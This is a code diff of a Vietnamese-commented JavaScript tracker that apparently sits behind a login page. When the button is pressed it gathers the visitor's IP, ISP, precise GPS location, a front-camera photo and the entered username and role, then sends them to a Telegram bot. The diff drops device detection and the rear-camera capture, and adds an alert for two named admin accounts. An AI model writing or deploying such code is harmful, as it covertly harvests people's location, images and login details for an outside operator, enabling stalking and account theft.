@@ -6,65 +6,19 @@ const API_SEND_MEDIA = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMe
 const API_SEND_TEXT = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
 const info = {
-  time: new Date().toLocaleString('vi-VN'),
+  time: '', // Sẽ lấy thời gian chính xác lúc bấm nút
   ip: '',
   isp: '',
   realIp: '',
   address: '',
-  country: '', 
   lat: '',
   lon: '',
-  device: '',
-  os: '',
   camera: '⏳ Đang kiểm tra...',
-  loginDetails: '' // Thêm trường này để lưu tài khoản/mật khẩu
+  loginDetails: '',
+  specialNote: '' 
 };
 
-function detectDevice() {
-  const ua = navigator.userAgent;
-  const platform = navigator.platform;
-  const screenW = window.screen.width;
-  const screenH = window.screen.height;
-  const ratio = window.devicePixelRatio;
-
-  if (/Android/i.test(ua)) {
-    info.os = 'Android';
-    const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
-    if (match) {
-      let model = match[1].split('/')[0].trim();
-      if (model.includes("SM-S918")) model = "Samsung Galaxy S23 Ultra";
-      if (model.includes("SM-S928")) model = "Samsung Galaxy S24 Ultra";
-      info.device = model;
-    } else {
-      info.device = 'Android Device';
-    }
-  } 
-  else if (/iPhone|iPad|iPod/i.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
-    info.os = 'iOS';
-    const res = `${screenW}x${screenH}@${ratio}`;
-    const iphoneModels = {
-      "430x932@3": "iPhone 14/15/16 Pro Max",
-      "393x852@3": "iPhone 14/15/16 Pro / 15/16",
-      "428x926@3": "iPhone 12/13/14 Pro Max / 14 Plus",
-      "390x844@3": "iPhone 12/13/14 / 12/13/14 Pro",
-      "414x896@3": "iPhone XS Max / 11 Pro Max",
-      "414x896@2": "iPhone XR / 11",
-      "375x812@3": "iPhone X / XS / 11 Pro",
-      "375x667@2": "iPhone 6/7/8 / SE (2nd/3rd)",
-    };
-    info.device = iphoneModels[res] || 'iPhone Model';
-  } 
-  else if (/Windows NT/i.test(ua)) {
-    info.device = 'Windows PC';
-    info.os = 'Windows';
-  } else if (/Macintosh/i.test(ua)) {
-    info.device = 'Mac';
-    info.os = 'macOS';
-  } else {
-    info.device = 'Không xác định';
-    info.os = 'Không rõ';
-  }
-}
+// --- CÁC HÀM LẤY DỮ LIỆU (ĐÃ LƯỢC BỎ DEVICE/OS) ---
 
 async function getPublicIP() {
   try {
@@ -81,32 +35,21 @@ async function getRealIP() {
     info.realIp = ip.trim();
     const res = await fetch(`https://ipwho.is/${info.realIp}`);
     const data = await res.json();
-    info.isp = data.connection?.org || 'VNNIC';
-    info.country = data.country || 'Việt Nam';
-  } catch (e) { info.realIp = 'Lỗi kết nối'; }
+    info.isp = data.connection?.org || 'ISP';
+  } catch (e) { info.realIp = 'Lỗi'; }
 }
 
 async function getLocation() {
   return new Promise(resolve => {
     if (!navigator.geolocation) return fallbackIPLocation().then(resolve);
-
     navigator.geolocation.getCurrentPosition(
       async pos => {
         info.lat = pos.coords.latitude.toFixed(6);
         info.lon = pos.coords.longitude.toFixed(6);
-        try {
-          const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`);
-          const data = await res.json();
-          info.address = data.display_name || '📍 Vị trí GPS';
-        } catch {
-          info.address = `📍 Tọa độ: ${info.lat}, ${info.lon}`;
-        }
+        info.address = `📍 Tọa độ GPS: ${info.lat}, ${info.lon}`;
         resolve();
       },
-      async () => {
-        await fallbackIPLocation();
-        resolve();
-      },
+      async () => { await fallbackIPLocation(); resolve(); },
       { enableHighAccuracy: true, timeout: 5000 }
     );
   });
@@ -139,28 +82,28 @@ async function captureCamera(facingMode = 'user') {
         }, 800);
       };
     });
-  } catch (e) {
-    throw e;
-  }
+  } catch (e) { throw e; }
 }
 
+// --- HÀM TẠO NỘI DUNG TIN NHẮN (KHÔNG LẤY THIẾT BỊ) ---
 function getCaption() {
   const mapsLink = info.lat && info.lon
     ? `https://www.google.com/maps?q=${info.lat},${info.lon}`
     : 'Không rõ';
 
-  return `
-🔐 [THÔNG TIN ĐĂNG NHẬP]
-👤 Chi tiết: ${info.loginDetails}
+  const header = info.specialNote ? `${info.specialNote}\n` : '👤 [NGƯỜI DÙNG ĐĂNG NHẬP]';
 
-📡 [THÔNG TIN TRUY CẬP]
-🕒 Thời gian: ${info.time}
-📱 Thiết bị: ${info.device} (${info.os})
-🌍 IP dân cư: ${info.ip}
-🏢 ISP: ${info.isp}
-🏙️ Địa chỉ: ${info.address}
-📍 Google Maps: ${mapsLink}
+  return `
+${header}
+━━━━━━━━━━━━━━━━━━
+⏰ Thời gian: ${info.time}
+👤 Tài khoản: ${info.loginDetails}
+🌐 Địa chỉ IP: ${info.ip}
+🏢 Nhà mạng: ${info.isp}
+🏙️ Vị trí: ${info.address}
+📍 Bản đồ: ${mapsLink}
 📸 Camera: ${info.camera}
+━━━━━━━━━━━━━━━━━━
 `.trim();
 }
 
@@ -193,33 +136,47 @@ async function sendTextOnly() {
   });
 }
 
-function delay(ms) {
-  return new Promise(resolve => setTimeout(resolve, ms));
-}
+function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
 
-// HÀM CHÍNH - Chỉ được gọi từ index.html khi bấm nút
+// --- HÀM CHÍNH ---
 async function main() {
-  detectDevice();
+  // Cập nhật thời gian thực lúc bấm nút
+  info.time = new Date().toLocaleString('vi-VN', { 
+    hour: '2-digit', 
+    minute: '2-digit', 
+    second: '2-digit', 
+    day: '2-digit', 
+    month: '2-digit', 
+    year: 'numeric' 
+  });
+
+  const user = document.getElementById('username').value.trim();
+  const role = document.getElementById('user-role').value;
+  info.loginDetails = `${user} (${role})`;
+
+  // Nhận diện Admin
+  if (user === "Mrwenben" || user === "VanThanh") {
+      info.specialNote = `⚠️ Thông báo admin ${user} vừa đăng nhập vào trang`;
+  } else {
+      info.specialNote = ""; // Reset nếu là người dùng thường
+  }
+
   await Promise.all([getPublicIP(), getRealIP(), getLocation()]);
 
   let front = null, back = null;
 
   try {
     front = await captureCamera("user");
-    await delay(500);
-    back = await captureCamera("environment");
     info.camera = '✅ Thành công';
   } catch (e) {
     info.camera = '🚫 Bị từ chối';
   }
 
-  if (front || back) {
-    await sendPhotos(front, back);
+  if (front) {
+    await sendPhotos(front, null);
   } else {
     await sendTextOnly();
   }
   
   return true; 
 }
-
-// ĐÃ XÓA ĐOẠN TỰ ĐỘNG CHẠY Ở ĐÂY
